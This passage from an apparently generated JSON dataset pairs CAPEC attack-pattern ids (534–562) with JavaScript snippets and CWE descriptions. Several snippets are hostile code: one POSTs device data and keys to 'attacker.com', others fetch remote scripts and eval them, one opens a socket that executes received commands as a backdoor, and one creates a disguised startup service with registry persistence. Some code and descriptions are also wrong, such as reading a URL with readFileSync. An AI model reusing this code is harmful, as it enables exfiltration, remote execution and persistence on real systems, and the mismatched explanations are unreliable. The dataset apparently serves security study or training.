        "description": "This JavaScript code snippet downloads and executes malicious code from a remote location without verifying its origin and integrity, allowing an attacker to introduce malicious code to the victim's system. This code embodies the CAPEC of altering the payload of a software update and relates to CWEs 494 (Download of Code Without Integrity Check), 506 (Embedded Malicious Code), and 497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "534",
        "code_snippet": "const maliciousFirmware = {\n  update: function() {\n    // CWE-506: Embedded Malicious Code\n    console.log('Malicious firmware update initiated');\n    // CWE-1329: Reliance on Component That is Not Updateable\n    this.version = 'vulnerable_version';\n  },\n  injectError: function() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Error injected into redundant block');\n  },\n  glitchProtection: function() {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    console.log('Voltage and clock glitches not detected');\n  }\n};\n\n// CWE-1277: Firmware Not Updateable\nObject.freeze(maliciousFirmware);\n\n// Simulate malicious firmware update\nmaliciousFirmware.update();\nmaliciousFirmware.injectError();\nmaliciousFirmware.glitchProtection();",
        "description": "This code snippet demonstrates a malicious firmware update that exploits various vulnerabilities. The 'update' function embeds malicious code, relies on a non-updateable component, and injects errors into a redundant block. The 'glitchProtection' function lacks proper protection against voltage and clock glitches. The firmware is then frozen to prevent updates, simulating a real-world scenario where an adversary introduces malicious hardware during an update or replacement procedure."
    },
    {
        "capec_id": "535",
        "code_snippet": "const maliciousComponent = {\n  init: function() {\n    // Embedded malicious code (CWE-506)\n    setTimeout(function() {\n      // Send sensitive data to attacker's server\n      fetch('https://attacker.com', {\n        method: 'POST',\n        body: JSON.stringify({\n          'deviceInfo': getDeviceInfo(),\n          'confidentialData': getConfidentialData()\n        })\n      });\n    }, 3000);\n  }\n};\n\n// Use a vulnerable third-party component (CWE-1395)\nconst vulnerableLib = require('vulnerable-lib');\n\n// Rely on an insufficiently trustworthy component (CWE-1357)\nconst untrustedComponent = require('untrusted-component');\n\n// Use a component that is not updateable (CWE-1329)\nconst outdatedComponent = require('outdated-component');\n\n// Access confidential information on the device (CWE-1297)\nfunction getDeviceInfo() {\n  return {\n    'serialNumber': 'SN123456789',\n    'firmwareVersion': '1.0.0'\n  };\n}\n\nfunction getConfidentialData() {\n  return {\n    'apiKey': 'API_KEY_1234567890',\n    'encryptionKey': 'ENCRYPTION_KEY_1234567890'\n  };\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC by embedding malicious code in a hardware component, relying on vulnerable third-party components, and accessing confidential information on the device. The malicious code sends sensitive data to the attacker's server, and the vulnerable components can be exploited to compromise the system."
    },
    {
        "capec_id": "536",
        "code_snippet": "const fs = require('fs');\n\n// CWE-284: Improper Access Control\nconst configPath = './config.json';\nfs.chmodSync(configPath, '0777'); // setting world-writable permissions\n\n// CWE-377: Insecure Temporary File\nconst tempFile = './temp.txt';\nfs.writeFileSync(tempFile, 'malicious_data');\n\n// CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nconst resourceId = './' + fs.readFileSync(tempFile, 'utf8');\nfs.writeFileSync(resourceId, 'suboptimal_config');\n\n// CWE-201: Insertion of Sensitive Information Into Sent Data\nconst dataToSend = {\n  'sensitive_info': fs.readFileSync(resourceId, 'utf8')\n};\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nconst debugMode = true;\nif (debugMode) {\n  // activate test or debug logic\n  const hwConfig = require('./hw_config');\n  hwConfig.setDebugMode(true);\n}\n\n// send data to another actor\nconst net = require('net');\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n  client.write(JSON.stringify(dataToSend));\n});",
        "description": "This code snippet demonstrates the CAPEC of injecting malicious data into critical operational data during configuration or recalibration, causing the system to perform in a suboptimal manner that benefits the adversary. It uses CWE-284 to set world-writable permissions on a configuration file, CWE-377 to create an insecure temporary file, CWE-99 to inject malicious data into a resource identifier, CWE-201 to send sensitive information to another actor, and CWE-1313 to activate test or debug logic at runtime."
    },
    {
        "capec_id": "537",
        "code_snippet": "const maliciousFirmware = {\n  updateFirmware: function() {\n    // CWE-506: Embedded Malicious Code\n    const maliciousCode = 'malicious_code_here';\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    const sensitiveInfo = getSystemInfo();\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    const confidentialData = getConfidentialData();\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    const glitchDetector = new GlitchDetector();\n    glitchDetector.disable();\n    // CWE-1329: Reliance on Component That is Not Updateable\n    const outdatedComponent = new OutdatedComponent();\n    outdatedComponent.update = function() {}\n    // Insert malicious code into firmware\n    this.firmwareCode = maliciousCode;\n  }\n};",
        "description": "This code snippet demonstrates a malicious firmware update function that embodies the CAPEC. It includes vulnerabilities related to CWE-506 (Embedded Malicious Code), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), CWE-1297 (Unprotected Confidential Information on Device is Accessible by OSAT Vendors), CWE-1247 (Improper Protection Against Voltage and Clock Glitches), and CWE-1329 (Reliance on Component That is Not Updateable). The malicious firmware update function inserts malicious code, exposes sensitive system information, and disables glitch detection, making it vulnerable to further compromise."
    },
    {
        "capec_id": "538",
        "code_snippet": "const axios = require('axios');\n\naxios.get('https://example.com/malicious-library.js').then(response => {\n  const maliciousCode = response.data;\n  eval(maliciousCode);\n});",
        "description": "This JavaScript code snippet downloads a malicious library from a remote location without verifying its integrity, and then executes it using the eval function, making it vulnerable to CWE-494, CWE-829, CWE-1395, CWE-506, and CWE-509."
    },
    {
        "capec_id": "539",
        "code_snippet": "const debugMode = true;\n\nif (debugMode) {\n  console.log('Debug mode enabled');\n  const sensitiveSystemInfo = {\n    'securityToken': '1234567890',\n    'securityIdentifier': 'admin'\n  };\n  console.log(sensitiveSystemInfo);\n\n  // Malicious code inserted\n  const maliciousFunction = () => {\n    console.log('Malicious function executed');\n    // Perform malicious actions\n  };\n  maliciousFunction();\n}\n",
        "description": "This code snippet demonstrates the CAPEC of inserting malicious functionality into an ASIC system during development. The code is written in JavaScript and includes CWEs 506, 497, 11, 1294, and 1259. The debug mode is enabled, exposing sensitive system information, including security tokens and identifiers. A malicious function is then executed, demonstrating the potential for disruption or further compromise."
    },
    {
        "capec_id": "540",
        "code_snippet": "function readBuffer(buffer, offset) {\n  var result = '';\n  for (var i = 0; i < 10; i++) {\n    result += buffer[offset + i];\n  }\n  return result;\n}\n\nvar buffer = 'Hello, World!';\nvar offset = 10;\nconsole.log(readBuffer(buffer, offset));",
        "description": "This code snippet demonstrates a buffer over-read vulnerability (CWE-126). The function readBuffer reads 10 characters from the buffer starting at the specified offset, without checking if the offset is within the bounds of the buffer. If the offset is greater than the length of the buffer, the function will read beyond the end of the buffer, potentially exposing sensitive information or causing a system crash."
    },
    {
        "capec_id": "541",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/version', (req, res) => {\n  if (req.headers['user-agent'].includes('Chrome')) {\n    res.status(200).json({ version: '1.2.3' });\n  } else if (req.headers['user-agent'].includes('Firefox')) {\n    res.status(200).json({ version: '1.2.4' });\n  } else {\n    res.status(404).json({ error: 'Not supported' });\n  }\n});\n\napp.get('/api/data', (req, res) => {\n  if (req.query.apiKey === 'validKey') {\n    setTimeout(() => {\n      res.status(200).json({ data: 'sensitive_data' });\n    }, 2000);\n  } else {\n    res.status(401).json({ error: 'Unauthorized' });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable API that can be fingerprinted by an adversary. The API responds differently based on the User-Agent header, revealing internal state information (CWE-204). The API also takes different amounts of time to complete requests based on the API key, revealing security-relevant information (CWE-208). Additionally, the API uses sensitive command-line arguments (apiKey) that can be seen by other processes on the operating system (CWE-214)."
    },
    {
        "capec_id": "542",
        "code_snippet": "const malware = {\n  init: function() {\n    // CWE-506: Embedded Malicious Code\n    const sysInfo = getSystemInformation();\n    sendToAttacker(sysInfo);\n  },\n  \n  getSystemInformation: function() {\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    const processList = getProcessList();\n    const networkConfig = getNetworkConfig();\n    return { processList, networkConfig };\n  },\n  \n  replicate: function() {\n    // CWE-509: Replicating Malicious Code (Virus or Worm)\n    const payload = getPayload();\n    spreadToOtherSystems(payload);\n  },\n  \n  trojanHorse: function() {\n    // CWE-507: Trojan Horse\n    const benignFunction = function() {\n      console.log('Benign function executed.');\n    };\n    const maliciousFunction = function() {\n      stealSensitiveData();\n    };\n    benignFunction();\n    maliciousFunction();\n  },\n  \n  spyware: function() {\n    // CWE-512: Spyware\n    const userData = collectUserData();\n    sendToAttacker(userData);\n  }\n};\n\nmalware.init();",
        "description": "This JavaScript code snippet demonstrates a malicious code that takes advantage of known vulnerabilities in an organizational IT environment. It collects system information, replicates itself to other systems, hides malicious code within a benign function, and collects user data without consent."
    },
    {
        "capec_id": "543",
        "code_snippet": "const maliciousSite = 'https://evil-site.com';\nconst legitimateSite = 'https://legitimate-site.com';\n\n// CWE-352: Cross-Site Request Forgery (CSRF)\nfunction csrfAttack() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', legitimateSite + '/login', true);\n  xhr.setRequestHeader('Cookie', 'sessionID=1234567890');\n  xhr.send();\n}\n\n// CWE-494: Download of Code Without Integrity Check\nfunction downloadMaliciousCode() {\n  const script = document.createElement('script');\n  script.src = maliciousSite + '/maliciousCode.js';\n  document.head.appendChild(script);\n}\n\n// CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nfunction redirectUser() {\n  const redirectUrl = new URL(maliciousSite, document.baseURI);\n  window.location.href = redirectUrl;\n}\n\n// CWE-506: Embedded Malicious Code\nfunction embeddedMaliciousCode() {\n  const maliciousScript = `eval('\\\"use strict\\\";alert(\\\"XSS\\\")');`;\n  eval(maliciousScript);\n}\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nfunction replicateMaliciousCode() {\n  const wormCode = `while (true) { /* malicious code */ }`;\n  eval(wormCode);\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of creating duplicates of legitimate websites to gather information or upload malware. It includes various CWEs such as CSRF, download of code without integrity check, URL redirection to untrusted site, embedded malicious code, and replicating malicious code."
    },
    {
        "capec_id": "544",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'malicious-supplier.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    const maliciousComponent = JSON.parse(data);\n    // inject malicious component into the supply chain\n    console.log('Malicious component injected:', maliciousComponent);\n  });\n});\n\nreq.on('error', (error) => {\n  console.error(error);\n});\n\nreq.end();",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that embodies the CAPEC of creating a false front organization with the appearance of a legitimate supplier in the critical life cycle path. The code establishes an HTTPS connection to a malicious supplier's website, ignoring certificate validation (CWE-295) and relying on security through obscurity (CWE-656). The code then injects a malicious system component into the organizational supply chain, creating an emergent resource (CWE-1229) that can be used by attackers. The code's observable behavioral discrepancy (CWE-207) with equivalent products makes it vulnerable to detection. Furthermore, the code incorrectly specifies the destination in the communication channel (CWE-941), allowing the malicious supplier to intercept and manipulate the request."
    },
    {
        "capec_id": "545",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction gatherSystemInfo() {\n  const systemResources = ['files', 'memory', 'registers', 'fuses', 'debugInfo'];\n  const sensitiveData = {};\n\n  systemResources.forEach((resource) => {\n    switch (resource) {\n      case 'files':\n        fs.readdirSync('/').forEach((file) => {\n          const filePath = path.join('/', file);\n          sensitiveData[file] = fs.readFileSync(filePath, 'utf8');\n        });\n        break;\n      case 'memory':\n        // Read memory contents without proper clearance\n        const memoryDump = readMemory();\n        sensitiveData['memory'] = memoryDump;\n        break;\n      case 'registers':\n        // Read hardware registers without proper zeroization\n        const registerValues = readRegisters();\n        sensitiveData['registers'] = registerValues;\n        break;\n      case 'fuses':\n        // Access security-sensitive information stored in fuses without protection\n        const fuseValues = readFuses();\n        sensitiveData['fuses'] = fuseValues;\n        break;\n      case 'debugInfo':\n        // Read debug information without proper clearance\n        const debugInfo = readDebugInfo();\n        sensitiveData['debugInfo'] = debugInfo;\n        break;\n    }\n  });\n\n  return sensitiveData;\n}\n\nconst systemInfo = gatherSystemInfo();\nconsole.log(systemInfo);",
        "description": "This JavaScript code snippet demonstrates the CAPEC pattern of gathering system information without proper clearance or protection. It uses various CWEs as context, including CWE-1239 (Improper Zeroization of Hardware Register), CWE-1243 (Sensitive Non-Volatile Information Not Protected During Debug), CWE-1258 (Exposure of Sensitive System Information Due to Uncleared Debug Information), and others. The code reads system resources such as files, memory, registers, fuses, and debug information without proper clearance or protection, exposing sensitive data."
    },
    {
        "capec_id": "546",
        "code_snippet": "const cloudStorage = {\n  'tenant1': {\n    'data': 'sensitive_info_tenant1'\n  },\n  'tenant2': {\n    'data': 'sensitive_info_tenant2'\n  }\n};\n\nfunction allocateResource(tenantId) {\n  // Insecurely allocate resource without clearing previous tenant's data\n  return cloudStorage[tenantId];\n}\n\n// Malicious tenant tries to access previous tenant's data\nconst maliciousTenantId = 'tenant2';\nconst allocatedResource = allocateResource(maliciousTenantId);\nconsole.log(allocatedResource.data); // Output: sensitive_info_tenant1",
        "description": "This code snippet demonstrates the CAPEC of insecure data deletion in a multi-tenant environment. The 'allocateResource' function does not properly clear previous tenant's data, allowing a malicious tenant to access sensitive information. This code embodies CWEs 284, 1266, 1272, 212, and 312, as it fails to restrict access, improperly scrubs sensitive data, and stores sensitive information in cleartext."
    },
    {
        "capec_id": "547",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.data = 'sensitive information';\n  }\n\n  deleteData() {\n    // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n    this.data = null;\n  }\n\n  destroySelf() {\n    // CWE-1082: Class Instance Self Destruction Control Element\n    this.deleteData();\n    delete this;\n  }\n\n  virtualMethod() {\n    // CWE-1087: Class with Virtual Method without a Virtual Destructor\n    console.log('Virtual method called');\n  }\n}\n\nconst hwComponent = new HardwareComponent();\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nhwComponent.destroySelf();\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// Assume this function injects errors into the redundant block\nfunction injectError() {\n  // Simulate error injection\n  console.log('Error injected');\n}\ninjectError();",
        "description": "This code snippet demonstrates a vulnerable HardwareComponent class that can be physically attacked and destroyed. The class contains a method to delete its own data, but the deletion is incomplete (CWE-1301). The class also has a virtual method without a virtual destructor (CWE-1087). An instance of the class can be destroyed by calling the destroySelf method, which deletes the instance (CWE-1082). Additionally, an unauthorized error can be injected into the redundant block, degrading the hardware redundancy (CWE-1334). The code also lacks protection against physical side channels, making it vulnerable to attacks that exploit patterns in power consumption, electromagnetic emissions, or acoustic emissions (CWE-1300)."
    },
    {
        "capec_id": "548",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = {\n    'username': 'admin',\n    'password': 'password123'\n  };\n  res.json(sensitiveInfo);\n});\n\napp.post('/storeData', (req, res) => {\n  const data = req.body;\n  fs.writeFileSync('data.txt', JSON.stringify(data));\n  res.send('Data stored successfully');\n});\n\napp.get('/reuseResource', (req, res) => {\n  const reusedResource = fs.readFileSync('data.txt', 'utf8');\n  res.json(reusedResource);\n});",
        "description": "This code snippet demonstrates the CAPEC by transmitting sensitive information in cleartext, storing sensitive information without proper access control, and reusing resources without clearing sensitive information. The /sensitiveData endpoint returns sensitive information in cleartext, violating CWE-319. The /storeData endpoint stores sensitive information in a file without proper access control, violating CWE-922. The /reuseResource endpoint reuses a resource (the data.txt file) without clearing sensitive information, violating CWE-226."
    },
    {
        "capec_id": "549",
        "code_snippet": "const fs = require('fs'); const net = require('net'); const exec = require('child_process').exec; let maliciousCode = fs.readFileSync('https://malicious-website.com/malicious.js', 'utf8'); eval(maliciousCode); let server = net.createServer((socket) => { socket.on('data', (data) => { exec(data.toString()); }); }); server.listen(8080, () => { console.log('Malicious server listening on port 8080'); });",
        "description": "This JavaScript code snippet demonstrates the CAPEC of installing and executing malicious code on a target system. It uses CWE-829 by importing functionality from an untrusted control sphere (the malicious.js file from a malicious website). It also uses CWE-506 by containing malicious code, CWE-494 by downloading and executing code without integrity checks, and CWE-1037 by potentially allowing processor optimization to remove or modify security-critical code. The code sets up a malicious server that listens for incoming connections and executes any received data as system commands, allowing an attacker to remotely execute arbitrary code on the target system."
    },
    {
        "capec_id": "550",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\n// CWE-1392: Use of Default Credentials\nconst defaultAdminCreds = {\n  username: 'admin',\n  password: 'password'\n};\n\n// CWE-1188: Initialization of a Resource with an Insecure Default\nconst serviceName = 'WindowsUpdateService';\nconst servicePath = 'C:\\\\Windows\\\\System32\\\\svchost.exe';\n\n// CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\nconst registryPath = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonationLevel = 'identified';\n\nexec(`sc create ${serviceName} binPath= ${servicePath} obj= ${defaultAdminCreds.username}:${defaultAdminCreds.password} type= own type= interact`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error creating service: ${error.message}`);\n    return;\n  }\n  console.log(`Service created successfully: ${serviceName}`);\n});\n\nexec(`reg add ${registryPath} /v ${serviceName} /t REG_SZ /d ${servicePath} /f`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error adding service to registry: ${error.message}`);\n    return;\n  }\n  console.log(`Service added to registry successfully: ${serviceName}`);\n});",
        "description": "This code snippet demonstrates the CAPEC of installing a new service that will be executed at startup, disguising the service name, and running it with elevated privileges. It incorporates CWEs 284, 1249, 1392, 1188, and 520 by using default admin credentials, initializing a resource with an insecure default, providing an application-level admin tool with an inconsistent view of the underlying OS, and using impersonation in a .NET application."
    },
    {
        "capec_id": "551",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\n// CWE-522: Insufficiently Protected Credentials\n// CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n// CWE-15: External Control of System or Configuration Setting\n// CWE-908: Use of Uninitialized Resource\n\nlet serviceConfig = {\n  'serviceName': 'myService',\n  'servicePath': '/path/to/service',\n  'credentials': {\n    'username': 'admin',\n    'password': 'password'\n  }\n};\n\n// Start the service without proper access control\nexec(`sudo systemctl start ${serviceConfig.serviceName}`, (error, stdout, stderr) => {\n  if (error) {\n    console.log(`Error starting service: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.log(`stderr: ${stderr}`);\n  }\n  console.log(`Service started: ${stdout}`);\n});\n\n// Modify the service configuration without proper access control\nexec(`sudo systemctl set-env ${serviceConfig.serviceName} DB_HOST=localhost`, (error, stdout, stderr) => {\n  if (error) {\n    console.log(`Error setting environment variable: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.log(`stderr: ${stderr}`);\n  }\n  console.log(`Environment variable set: ${stdout}`);\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying existing services or enabling disabled services by using Node.js to start and configure a system service without proper access control, insufficiently protected credentials, and untrusted execution core. It also shows the use of uninitialized resources and external control of system settings."
    },
    {
        "capec_id": "552",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSystemInfo() {\n  const userInput = document.getElementById('inputField').value;\n  const command = `systeminfo ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\ngetSystemInfo();",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that allows an adversary to exploit weaknesses in authentication and access control, potentially leading to the installation of malware or rootkits. The code uses user-input data to construct an OS command without proper neutralization of special elements, making it vulnerable to OS command injection (CWE-78). Additionally, it exposes sensitive system information to an unauthorized control sphere (CWE-497) and lacks proper access control (CWE-284), allowing malicious code to be executed. The code may also contain embedded malicious code (CWE-506) or Trojan Horse functionality (CWE-507), making it a potential target for adversaries."
    },
    {
        "capec_id": "554",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/admin', (req, res) => {\n  if (req.body.password === 'admin') {\n    // Client-side enforcement of server-side security\n    if (req.headers['x-admin-access'] === 'true') {\n      // Unprotected alternate path\n      res.send('Welcome, admin!');\n    } else {\n      res.status(401).send('Unauthorized');\n    }\n  } else {\n    res.status(401).send('Invalid password');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that relies on client-side enforcement of server-side security. The server expects the client to send a custom 'x-admin-access' header with a value of 'true' to access the admin endpoint. However, an attacker can bypass this protection by simply sending the required header, even if they don't have the correct password. This code also uses low-level functionality (custom headers) that is not properly validated, and lacks a sufficient protection mechanism to defend against directed attacks."
    },
    {
        "capec_id": "555",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password123',\n  database: 'mydb'\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send({ message: 'Error logging in' });\n    } else if (results.length > 0) {\n      res.send({ message: 'Login successful' });\n    } else {\n      res.status(401).send({ message: 'Invalid credentials' });\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with weak password requirements and insufficiently protected credentials. The password is stored in plain text in the database and is transmitted over the network without encryption, making it susceptible to unauthorized interception and retrieval. The code also lacks password aging and does not require strong passwords, making it easier for attackers to compromise user accounts."
    },
    {
        "capec_id": "556",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction openFile(filePath) {\n    const fileExtension = path.extname(filePath);\n    const handlerPath = getHandlerPath(fileExtension);\n    fs.chmodSync(handlerPath, '0777');\n    fs.openSync(filePath, 'r', (err, fd) => {\n        if (err) {\n            console.error(err);\n            return;\n        }\n        fs.fchmodSync(fd, '0777');\n        fs.closeSync(fd);\n        require('child_process').execFile(handlerPath, [filePath]);\n    });\n}\n\nfunction getHandlerPath(fileExtension) {\n    // Assume this function returns the path to the handler executable based on the file extension\n    return \"/path/to/handler\";\n}\n\nopenFile(\"user-inputted-file.txt\");",
        "description": "This code snippet demonstrates the CAPEC of exploiting file handlers to execute arbitrary programs. It uses CWE-284 (Improper Access Control) by not restricting access to the file handler, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by relying on the file extension to determine the handler, CWE-73 (External Control of File Name or Path) by allowing user input to control the file path, CWE-64 (Windows Shortcut Following) by not handling Windows shortcuts, and CWE-910 (Use of Expired File Descriptor) by using the file descriptor after it has been closed. The code opens a file, determines its handler based on the file extension, and executes the handler with the file as an argument. This can lead to arbitrary code execution if an attacker can manipulate the file extension or handler path."
    },
    {
        "capec_id": "557",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('aes-256-cbc', 'secretKey');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction decryptData(encryptedData) {\n  const decipher = crypto.createDecipher('aes-256-cbc', 'secretKey');\n  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\n// Using an obsolete function\nconst fs = require('fs');\nfs.writeFileSync('data.txt', encryptData('confidentialData'), 'utf8');\n\n// Reliance on runtime component in generated code\nconst runtimeComponent = require('runtime-component');\nconst generatedCode = runtimeComponent.generateCode();\n\n// Failure to provide confidentiality for stored data\nconst storedData = 'unencryptedConfidentialData';\nconsole.log(storedData);\n\n// State synchronization error\nlet state = 'initial';\nfunction changeState(newState) {\n  state = newState;\n}\n\nchangeState('newState');\nconsole.log(state);",
        "description": "This code snippet demonstrates a deprecated CAPEC that is not directly related to a weakness, social engineering, supply chains, or a physical-based attack. It incorporates multiple CWEs, including CWE-477 (Use of Obsolete Function) by using the deprecated fs.writeFileSync function, CWE-1101 (Reliance on Runtime Component in Generated Code) by relying on a runtime component to generate code, CWE-218 (Failure to provide confidentiality for stored data) by storing unencrypted confidential data, and CWE-373 (State Synchronization Error) by having a state synchronization error in the changeState function."
    },
    {
        "capec_id": "558",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('child_process');\n\n// CWE-284: Improper Access Control\nconst executablePath = './trustedExecutable';\nfs.chmodSync(executablePath, '0777');\n\n// CWE-78: OS Command Injection\nconst userInput = 'maliciousCommand';\nchildProcess.exec(`./${userInput}`);\n\n// CWE-114: Process Control\nconst untrustedLibrary = './untrustedLibrary';\nrequire(untrustedLibrary);\n\n// CWE-733 and CWE-1037: Optimization Removal or Modification of Security-critical Code\nfunction securityCriticalFunction() {\n  // Security-critical code\n  const secureVariable = 'secureValue';\n  return secureVariable;\n}\n\n// Compiler or processor optimization may remove or modify security-critical code\nconst optimizedFunction = securityCriticalFunction;\nconsole.log(optimizedFunction());",
        "description": "This code snippet demonstrates the CAPEC of replacing a trusted executable with a malicious version by exploiting weaknesses in privilege management or access control. It includes CWE-284 by setting improper permissions on the trusted executable, CWE-78 by injecting malicious commands through user input, CWE-114 by loading an untrusted library, and CWE-733 and CWE-1037 by demonstrating how compiler or processor optimization can remove or modify security-critical code."
    },
    {
        "capec_id": "559",
        "code_snippet": "const satelliteChannel = {\n  'transmit': function(data) {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    // No verification of the source of the incoming request\n    const request = receiveRequest();\n    const endpoint = request.endpoint;\n    // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    // No restriction on the endpoint, allowing any endpoint to connect\n    const channel = establishChannel(endpoint);\n    // CWE-927: Use of Implicit Intent for Sensitive Communication\n    // Using an implicit intent to transmit sensitive data\n    channel.send(data);\n  },\n  'receive': function() {\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    // No verification of message integrity during transmission\n    const message = receiveMessage();\n    return message;\n  }\n};\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n// Overlapping protected and unprotected regions in the address map\nconst rogueUplinkStation = {\n  'transmit': function(disruptiveSignal) {\n    // Overlapping protected and unprotected regions allow the rogue uplink station to bypass access control\n    satelliteChannel.transmit(disruptiveSignal);\n  }\n};",
        "description": "This code snippet demonstrates a vulnerable satellite communication system that can be disrupted by a rogue uplink station. The system lacks proper verification of the source of incoming requests, allowing any endpoint to connect and transmit data. The system also uses implicit intents for sensitive communication and does not properly enforce message integrity during transmission. Furthermore, the address map of the on-chip fabric has overlapping protected and unprotected regions, allowing the rogue uplink station to bypass access control and disrupt the intended transmission."
    },
    {
        "capec_id": "560",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'password123'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with a weak password storage mechanism. The passwords are stored in plaintext in a JavaScript object, making it susceptible to unauthorized access. The system also lacks any mechanism to prevent brute-force attacks, password aging, or account lockout policies, making it vulnerable to various types of attacks."
    },
    {
        "capec_id": "561",
        "code_snippet": "const adminCredentials = { username: 'admin', password: 'P@ssw0rd' };\n\nfunction authenticateAdmin() {\n  if (adminCredentials.username === 'admin' && adminCredentials.password === 'P@ssw0rd') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nfunction accessAdminShare() {\n  if (authenticateAdmin()) {\n    // Access Windows Admin Shares\n    console.log('Access granted to Windows Admin Shares.');\n  } else {\n    console.log('Access denied to Windows Admin Shares.');\n  }\n}\n\naccessAdminShare();",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that uses a hardcoded admin username and password, which can be easily obtained by an adversary. The code uses single-factor authentication and does not implement password aging or strong password requirements, making it susceptible to unauthorized access to Windows Admin Shares."
    },
    {
        "capec_id": "562",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\nconst path = require('path');\n\napp.post('/upload', (req, res) => {\n    const file = req.files.file;\n    const tempPath = path.join(__dirname, file.name);\n    fs.writeFileSync(tempPath, file.data);\n    res.send(`File uploaded successfully!`);\n});\n\napp.get('/download', (req, res) => {\n    const filePath = path.join(__dirname, 'user-uploaded-files', req.query.fileName);\n    res.download(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js server that allows unrestricted file uploads and downloads without proper access control or integrity checks. The server uses the Express.js framework and allows users to upload files to a shared location without validating the file type or contents. The uploaded files are stored in a directory with insecure permissions, making them accessible to unauthorized actors. The server also allows users to download files without verifying their origin or integrity, making it possible for an adversary to manipulate the files and execute malicious code."
    },
    {
        "capec_id": "563",
